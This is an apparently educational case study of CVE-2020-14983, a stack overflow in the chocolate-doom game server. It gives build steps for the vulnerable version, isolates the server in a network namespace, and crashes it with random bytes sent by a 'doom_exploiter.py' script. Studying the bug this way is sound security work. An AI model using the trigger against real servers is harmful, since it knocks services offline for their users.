A Real Stack Overflow Vulnerability in the `chocolate-doom` Doom Port
=====================================================================

This was a vulnerability handled in [bsc#1173595][1], CVE-2020-14983.

[1]: https://bugzilla.suse.com/show_bug.cgi?id=1173595

`chocolate-doom` is a port of the classical Doom 3D shooter engine to various
platforms. It aims to be as close to the original as possible.

The vulnerability is in network handling code for multiplayer games.

In the [upstream repo][2] the issue was fixed in [this commit][3] on the
master branch and in version 3.0.1. Tag 3.0.0 still contains the
vulnerability.

[2]: https://github.com/chocolate-doom/chocolate-doom.git

The vulnerability does not allow arbitrary code execution, only
denial-of-service. It is still an interesting case study.

Building chocolate-doom
-----------------------

```sh
# install required build dependencies
$ sudo zypper in libSDL2*-devel SDL2_*devel

# clone and checkout the vulnerable upstream version
$ git clone https://github.com/chocolate-doom/chocolate-doom.git
$ cd chocolate-doom
$ git checkout chocolate-doom-3.0.0

# setup an out-of-tree build
$ ./autogen.sh
$ make distclean
$ mkdir ../build
$ cd ../build

# the -fcommon switch is necessary with newer compilers to avoid a linker error
$ CFLAGS="-fcommon" ../chocolate-doom/configure --prefix=$PWD/../install
$ make
$ make install

# download a shareware version of the Doom1 data file
$ curl -O https://www.quaddicted.com/files/idgames/idstuff/doom/win95/doom95.zip
$ unzip doom95.zip DOOM1.WAD
$ mkdir -p ~/.local/share/games/doom
$ mv DOOM1.WAD ~/.local/share/games/doom/

# after this you can test whether the installation works by running the single
# player version of chocolate-doom. You need to do this is in a graphical
# environment:
$ cd ../install
$ ./bin/chocolate-doom
```

Running the Network Server
--------------------------

The buffer overflow issue is in the UDP network server code. `chocolate-doom`
does not seem to have a way to configure the listen address / network
interface to restrict its scope. Therefore, so that we don't have to connect
the vulnerable version to a live network, we run the server only in a
split-off network namespace:

```sh
# split-off a network and user namespace to run chocolate-doom in an isolated
# network environment
$ unshare -n -U -r
# set the new loopback device online
(net-ns) $ ip link set up dev lo

# enter the installation diretory of chocolate-doom
(net-ns) $ cd install
# run a dedicated server (this does not need a graphical environment)
(net-ns) $ ./bin/chocolate-doom -privateserver -dedicated
```

Triggering the Issue
--------------------

In a second shell we enter the new network namespace and connect to the server
using the `doom_exploiter.py` script. We simply send random data to trigger a
crash in the server:

```sh
$ nsenter -n -U --preserve-credentials -t `pidof chocolate-doom`
(net-ns) $ dd if=/dev/urandom of=exploit.bin bs=255 count=1
[...]
(net-ns) $ ./doom_exploiter.py --exploit exploit.bin localhost
```

In the original shell running chocolate-doom you should see:

```
                         Chocolate Doom 3.0.0
Z_Init: Init zone memory allocation daemon.
zone memory: 0x7f3ccb4ce010, 1000000 allocated for zone
Dedicated server mode.
Segmentation fault (core dumped)
```

Analysing the Issue
-------------------

Look at the [bugfix][3] for the issue. The vulnerable code is in
`NET_ReadSettings()`. The call to this function in the server context is
performed in `net_server.c:921`. There you can also see where the vulnerable
`net_gamesettings_t settings` buffer is placed onto the stack. Examine this
data type and its use in in the for loop in `net_structrw.c:119` to understand
the overflow scenario.

[3]: https://github.com/chocolate-doom/chocolate-doom/commit/f1a8d991aa8a14afcb605cf2f65cd15fda204c56

Why can this overflow not be used to achieve arbitrary code execution? Look at
the memory layout to see what happens during overflow. Also consider other
problems this overflow could have for full code execution.

Solution
--------

The limitation lies in the particular use of `NET_ReadInt8()` on `(unsigned int*)
&settings->player_classes[i]`. What happens when overflowing the 255 available
bytes?
